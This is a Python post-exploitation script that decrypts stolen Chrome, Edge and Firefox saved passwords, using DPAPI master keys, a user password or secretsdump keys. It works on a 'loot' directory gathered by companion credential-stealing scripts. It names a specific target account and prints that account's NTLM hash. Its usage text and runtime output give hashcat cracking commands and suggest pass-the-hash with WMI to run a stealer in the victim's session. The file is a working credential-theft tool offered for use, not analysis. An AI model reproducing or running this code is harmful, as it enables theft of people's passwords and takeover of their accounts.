#!/usr/bin/env python3
"""
parse_creds.py — Offline Chrome/Edge/Firefox credential decryptor + DPAPI solver
Parses the loot directory produced by harvest_creds.ps1 or cred_steal.ps1.

Requirements:
    pip install pypykatz pycryptodome

Usage:
    # If you have the user password:
    python3 parse_creds.py --loot ./loot --password "P@ssw0rd" --sid S-1-5-21-...-1003

    # If you have the DPAPI master key files (from loot/USER/dpapi_protect/):
    python3 parse_creds.py --loot ./loot --mkf loot/abdum/dpapi_protect/

    # After secretsdump (we have DPAPI_SYSTEM keys):
    python3 parse_creds.py --loot ./loot \
        --dpapi-machinekey a96859bcc6487989f95eddbfc662c30361a8f80a \
        --dpapi-userkey    ecae11f47a4db563c28ee0bdff0a94bd61e54ec3

DPAPI_SYSTEM keys only decrypt MACHINE-context blobs.
Chrome uses USER-context blobs — need user password or cracked master key.

Quick workflow for this target:
    # 1. Crack abdum NTLM:  hashcat -m 1000 hash.txt rockyou.txt
    # 2. Re-run with --password <cracked>
    # 3. Or PTH + WMI to run cred_steal.ps1 in user session directly
"""

import os, sys, json, base64, sqlite3, struct, glob, argparse, hashlib, hmac
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print('[!] pycryptodome missing:  pip install pycryptodome', file=sys.stderr)

try:
    import pypykatz
    from pypykatz.dpapi.dpapi import DPAPI
    from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
    from pypykatz.dpapi.structures.blob import DPAPI_BLOB
    HAS_PYPYKATZ = True
except ImportError:
    HAS_PYPYKATZ = False
    print('[!] pypykatz missing:  pip install pypykatz', file=sys.stderr)

# ── DPAPI helpers ─────────────────────────────────────────────────────────────

class DPAPISession:
    def __init__(self, args):
        self.args = args
        self.dpapi = DPAPI() if HAS_PYPYKATZ else None
        self.mk_cache = {}   # guid → decrypted master key bytes
        self._load_masterkeys()

    def _load_masterkeys(self):
        if not HAS_PYPYKATZ:
            return
        a = self.args

        # Load from master key files directory
        mkf_dirs = []
        if a.mkf:
            mkf_dirs.append(a.mkf)
        if a.loot:
            for p in Path(a.loot).rglob('dpapi_protect*'):
                if p.is_dir():
                    mkf_dirs.append(str(p))

        for d in mkf_dirs:
            for f in Path(d).iterdir():
                if not f.is_file():
                    continue
                try:
                    mkfile = MasterKeyFile.from_bytes(f.read_bytes())
                    # Try with user password
                    if a.password and a.sid:
                        mk = mkfile.masterkey
                        mk.decrypt_with_password(a.sid, a.password)
                        if mk.decrypted:
                            self.mk_cache[mkfile.guid] = mk.key
                            print(f'[+] MK decrypted (password): {mkfile.guid}')
                            continue
                    # Try with DPAPI_SYSTEM machinekey
                    if a.dpapi_machinekey:
                        mk = mkfile.masterkey
                        mk.decrypt_with_key(bytes.fromhex(a.dpapi_machinekey))
                        if mk.decrypted:
                            self.mk_cache[mkfile.guid] = mk.key
                            print(f'[+] MK decrypted (machinekey): {mkfile.guid}')
                            continue
                    # Try with DPAPI_SYSTEM userkey
                    if a.dpapi_userkey:
                        mk = mkfile.masterkey
                        mk.decrypt_with_key(bytes.fromhex(a.dpapi_userkey))
                        if mk.decrypted:
                            self.mk_cache[mkfile.guid] = mk.key
                            print(f'[+] MK decrypted (userkey): {mkfile.guid}')
                except Exception as e:
                    pass

        if self.mk_cache:
            print(f'[+] {len(self.mk_cache)} master key(s) loaded')
        else:
            print('[!] No master keys decrypted — Chrome/Edge passwords need user password')
            print('    Crack NTLM:  hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt')
            print('    Then re-run: --password <cracked> --sid <user_sid>')

    def decrypt_blob(self, blob_bytes):
        if not HAS_PYPYKATZ or not self.mk_cache:
            return None
        try:
            blob = DPAPI_BLOB.from_bytes(blob_bytes)
            guid = blob.mk_guid
            if guid in self.mk_cache:
                blob.decrypt(self.mk_cache[guid])
                if blob.decrypted:
                    return blob.cleartext
        except Exception:
            pass
        return None

# ── Chrome / Edge ─────────────────────────────────────────────────────────────

def aes_gcm_decrypt(key, nonce, ciphertext_with_tag):
    if not HAS_CRYPTO:
        return None
    try:
        tag  = ciphertext_with_tag[-16:]
        data = ciphertext_with_tag[:-16]
        c    = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return c.decrypt_and_verify(data, tag)
    except Exception:
        return None

def dump_chromium(browser_name, user_dir, dpapi_sess, results):
    ls_path = Path(user_dir) / 'Local State'
    if not ls_path.exists():
        return

    aes_key = None
    try:
        ls = json.loads(ls_path.read_text(encoding='utf-8', errors='replace'))
        enc_key_b64 = ls.get('os_crypt', {}).get('encrypted_key', '')
        if enc_key_b64:
            enc_key = base64.b64decode(enc_key_b64)
            dpapi_blob = enc_key[5:]   # strip 'DPAPI' prefix
            decrypted  = dpapi_sess.decrypt_blob(dpapi_blob)
            if decrypted:
                aes_key = decrypted
                print(f'  [{browser_name}] AES key decrypted ({len(aes_key)} bytes)')
            else:
                print(f'  [{browser_name}] AES key NOT decrypted (need user master key)')
    except Exception as e:
        print(f'  [{browser_name}] Local State parse error: {e}')

    # Scan for Login Data files
    for login_db in Path(user_dir).rglob('Login Data'):
        if 'Journal' in str(login_db):
            continue
        try:
            conn = sqlite3.connect(f'file:{login_db}?mode=ro', uri=True)
            cur  = conn.cursor()
            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, user, pwd_blob in cur.fetchall():
                pwd_blob = bytes(pwd_blob) if pwd_blob else b''
                pwd = '<no blob>'
                if pwd_blob:
                    if pwd_blob[:3] == b'v10' and aes_key:
                        nonce  = pwd_blob[3:15]
                        ctdata = pwd_blob[15:]
                        plain  = aes_gcm_decrypt(aes_key, nonce, ctdata)
                        pwd = plain.decode('utf-8', errors='replace') if plain else '<aes_failed>'
                    elif pwd_blob[:3] == b'v10':
                        pwd = '<needs_aes_key>'
                    else:
                        # Legacy DPAPI blob
                        plain = dpapi_sess.decrypt_blob(pwd_blob)
                        pwd = plain.decode('utf-8', errors='replace') if plain else '<dpapi_failed>'
                if url or user:
                    results.append(f'[{browser_name}] {url} | {user} | {pwd}')
            conn.close()
        except Exception as e:
            print(f'  [{browser_name}] DB error ({login_db.name}): {e}')

# ── Firefox ───────────────────────────────────────────────────────────────────

def firefox_derive_key(global_salt, master_password, entry_salt):
    # NSS key derivation (no master password = empty string)
    hp  = hashlib.sha1(global_salt + master_password.encode()).digest()
    pes = entry_salt + b'\x00' * (20 - len(entry_salt))
    chp = hashlib.sha1(pes + hp).digest()
    k1  = hmac.new(chp, pes + entry_salt, hashlib.sha1).digest()
    tk  = hmac.new(chp, pes, hashlib.sha1).digest()
    k2  = hmac.new(chp, tk + entry_salt, hashlib.sha1).digest()
    k   = (k1 + k2)[:24]     # 3DES key
    iv  = (k1 + k2)[24:32]   # 3DES IV
    return k, iv

def decode_ber_sequence(data):
    """Minimal BER decoder — returns list of (tag, value) tuples."""
    items = []
    i = 0
    while i < len(data):
        tag = data[i]; i += 1
        if i >= len(data):
            break
        l = data[i]; i += 1
        if l & 0x80:
            nl = l & 0x7f
            l  = int.from_bytes(data[i:i+nl], 'big'); i += nl
        items.append((tag, data[i:i+l])); i += l
    return items

def ff_decrypt_field(enc_b64, global_salt, master_password):
    try:
        raw = base64.b64decode(enc_b64)
        seq = decode_ber_sequence(raw)
        if not seq:
            return None
        inner = decode_ber_sequence(seq[0][1])
        # Find entry_salt (OCTET STRING in the first OID sequence)
        entry_salt = None
        ct = None
        for tag, val in inner:
            if tag == 0x04:   # OCTET STRING
                if entry_salt is None:
                    entry_salt = val
                else:
                    ct = val
        if entry_salt is None or ct is None:
            return None
        k, iv = firefox_derive_key(global_salt, master_password, entry_salt)
        from Crypto.Cipher import DES3
        d = DES3.new(k, DES3.MODE_CBC, iv)
        plain = d.decrypt(ct)
        pad = plain[-1]
        return plain[:-pad].decode('utf-8', errors='replace')
    except Exception:
        return None

def dump_firefox(profile_dir, results):
    key4_path   = Path(profile_dir) / 'key4.db'
    logins_path = Path(profile_dir) / 'logins.json'
    if not key4_path.exists() or not logins_path.exists():
        return

    global_salt = b''
    try:
        conn = sqlite3.connect(f'file:{key4_path}?mode=ro', uri=True)
        cur  = conn.cursor()
        try:
            cur.execute("SELECT item1 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if row:
                global_salt = bytes(row[0])
        except Exception:
            pass
        conn.close()
    except Exception as e:
        results.append(f'[FF] {profile_dir} | key4.db error: {e}')
        return

    try:
        lj = json.loads(logins_path.read_text(encoding='utf-8', errors='replace'))
    except Exception:
        return

    if not HAS_CRYPTO:
        results.append(f'[FF] {profile_dir} | pycryptodome needed for decryption')
        for l in lj.get('logins', []):
            results.append(f'[FF-raw] {l.get("hostname","")} | encUser={l.get("encryptedUsername","")}')
        return

    for l in lj.get('logins', []):
        hostname = l.get('hostname', '')
        u_enc    = l.get('encryptedUsername', '')
        p_enc    = l.get('encryptedPassword', '')
        user = ff_decrypt_field(u_enc, global_salt, '') or '<failed>'
        pwd  = ff_decrypt_field(p_enc, global_salt, '') or '<failed>'
        results.append(f'[FF] {hostname} | {user} | {pwd}')

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description='Offline browser credential decryptor')
    ap.add_argument('--loot',            default='./loot', help='Loot directory from harvest_creds.ps1')
    ap.add_argument('--password',        help='Target user plaintext password (for DPAPI master key decryption)')
    ap.add_argument('--sid',             help='Target user SID (S-1-5-21-...)')
    ap.add_argument('--mkf',             help='Directory containing DPAPI master key files')
    ap.add_argument('--dpapi-machinekey',help='DPAPI_SYSTEM machinekey hex (from secretsdump)')
    ap.add_argument('--dpapi-userkey',   help='DPAPI_SYSTEM userkey hex (from secretsdump)')
    ap.add_argument('--out',             default='creds_out.txt')
    args = ap.parse_args()

    print('[*] DPAPI target:  TURANSEC\\abdum  (S-1-5-21-...-1003)')
    print('[*] Known NTLM:    3dbe42b122c6d0a15b0c3eb0521cd1a8')
    print('[*] If not cracked yet:')
    print('    hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt')
    print()

    dpapi = DPAPISession(args)
    results = []

    loot = Path(args.loot)
    if not loot.exists():
        print(f'[!] Loot dir not found: {loot}')
        sys.exit(1)

    # Walk per-user directories
    for user_dir in loot.iterdir():
        if not user_dir.is_dir():
            continue
        print(f'\n[*] Processing user: {user_dir.name}')

        # Chrome: find any chrome_LocalState.json
        ls = user_dir / 'chrome_LocalState.json'
        if ls.exists():
            chr_dir = user_dir  # synthetic — we have the local state here
            # Try to find Login Data files
            for db in user_dir.glob('chrome_*_LoginData.db'):
                try:
                    aes_key = None
                    ls_json  = json.loads(ls.read_text(encoding='utf-8', errors='replace'))
                    enc_key  = base64.b64decode(ls_json.get('os_crypt', {}).get('encrypted_key', ''))
                    if enc_key:
                        dpapi_blob = enc_key[5:]
                        dec = dpapi.decrypt_blob(dpapi_blob)
                        if dec:
                            aes_key = dec
                    conn = sqlite3.connect(f'file:{db}?mode=ro', uri=True)
                    cur  = conn.cursor()
                    cur.execute('SELECT origin_url, username_value, password_value FROM logins')
                    for url, user, pwd_blob in cur.fetchall():
                        pwd_blob = bytes(pwd_blob) if pwd_blob else b''
                        pwd = '<no_blob>'
                        if pwd_blob:
                            if pwd_blob[:3] == b'v10' and aes_key:
                                plain = aes_gcm_decrypt(aes_key, pwd_blob[3:15], pwd_blob[15:])
                                pwd = plain.decode('utf-8', errors='replace') if plain else '<aes_fail>'
                            elif pwd_blob[:3] == b'v10':
                                pwd = '<needs_aes_key>'
                            else:
                                plain = dpapi.decrypt_blob(pwd_blob)
                                pwd = plain.decode('utf-8', errors='replace') if plain else '<dpapi_fail>'
                        results.append(f'[Chrome] {url} | {user} | {pwd}')
                    conn.close()
                except Exception as e:
                    print(f'  [Chrome] error: {e}')

        # Edge
        for db in user_dir.glob('edge_*_LoginData.db'):
            els = user_dir / 'edge_LocalState.json'
            if not els.exists():
                continue
            try:
                aes_key = None
                els_json = json.loads(els.read_text(encoding='utf-8', errors='replace'))
                enc_key  = base64.b64decode(els_json.get('os_crypt', {}).get('encrypted_key', ''))
                if enc_key:
                    dec = dpapi.decrypt_blob(enc_key[5:])
                    if dec:
                        aes_key = dec
                conn = sqlite3.connect(f'file:{db}?mode=ro', uri=True)
                cur  = conn.cursor()
                cur.execute('SELECT origin_url, username_value, password_value FROM logins')
                for url, user, pwd_blob in cur.fetchall():
                    pwd_blob = bytes(pwd_blob) if pwd_blob else b''
                    pwd = '<no_blob>'
                    if pwd_blob:
                        if pwd_blob[:3] == b'v10' and aes_key:
                            plain = aes_gcm_decrypt(aes_key, pwd_blob[3:15], pwd_blob[15:])
                            pwd = plain.decode('utf-8', errors='replace') if plain else '<aes_fail>'
                        elif pwd_blob[:3] == b'v10':
                            pwd = '<needs_aes_key>'
                        else:
                            plain = dpapi.decrypt_blob(pwd_blob)
                            pwd = plain.decode('utf-8', errors='replace') if plain else '<dpapi_fail>'
                    results.append(f'[Edge] {url} | {user} | {pwd}')
                conn.close()
            except Exception as e:
                print(f'  [Edge] error: {e}')

        # Firefox
        for ff_dir in user_dir.glob('ff_*'):
            if ff_dir.is_dir():
                dump_firefox(ff_dir, results)

    print(f'\n[+] {len(results)} credential entries found')
    with open(args.out, 'w', encoding='utf-8') as f:
        for r in results:
            f.write(r + '\n')
    print(f'[+] Written to: {args.out}')

    # Print non-failed entries
    ok = [r for r in results if '<' not in r.split('|')[-1]]
    if ok:
        print(f'\n[+] Plaintext credentials ({len(ok)}):')
        for r in ok:
            print(' ', r)
    else:
        print('\n[!] No plaintext passwords yet.')
        print('    Next step: crack NTLM then run again with --password <cracked>')
        print(f'    hashcat -m 1000 3dbe42b122c6d0a15b0c3eb0521cd1a8 /usr/share/wordlists/rockyou.txt')

if __name__ == '__main__':
    main()
